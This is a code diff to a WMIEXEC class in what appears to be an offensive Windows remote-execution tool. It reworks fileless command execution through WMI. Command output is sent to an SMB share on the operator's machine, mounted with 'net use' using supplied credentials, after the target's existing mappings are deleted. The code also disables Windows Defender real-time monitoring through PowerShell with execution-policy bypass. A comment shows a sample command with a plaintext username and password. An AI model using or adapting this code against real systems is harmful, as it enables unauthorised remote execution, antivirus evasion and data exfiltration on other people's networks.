@@ -142,6 +142,7 @@ class WMIEXEC:
             self.disable_defender()
             self.execute_remote(data)
 
+
     def execute_remote(self, data):
         self.__output = '\\Windows\\Temp\\' + gen_random_string(6)
 
@@ -153,18 +154,38 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output_remote()
 
+
     def execute_fileless(self, data):
         self.__output = gen_random_string(6)
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
 
-        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, self.__share_name, self.__output)
+
+        commandData = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
+                                                                         self.__share_name,
+                                                                         self.__output)
+        #commandData = data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
+        #                                                                 self.__share_name,
+        #                                                                 self.__output)
+        
         #adding creds gets past systems disallowing guest-auth
-        command = self.__shell + '"net use \\\\{}\\{} /p:no /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
+        command = self.__shell + '"net use * /d /y & '
+        command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
+                                                                                                 self.__share_name, 
+                                                                                                 self.__username, 
+                                                                                                 self.__password, 
+                                                                                                 commandData)
+        #command += 'net use \\\\{}\\{} /savecred /p:no /user:{} {}"'.format(local_ip, 
+        #                                                                                         self.__share_name, 
+        #                                                                                         self.__username, 
+        #                                                                                         self.__password 
+        #                                                                                         )
         
         logging.debug('wmi Executing_fileless command: {}'.format(command))
 
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output_fileless()
+
 
     def get_output_fileless(self):
         while True:
@@ -207,6 +228,7 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         print('            [!] Sleeping while notifications are disabled [!] ')
         time.sleep(4)
+
 
     def disable_defender(self):
         command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableRealtimeMonitoring $true;"'
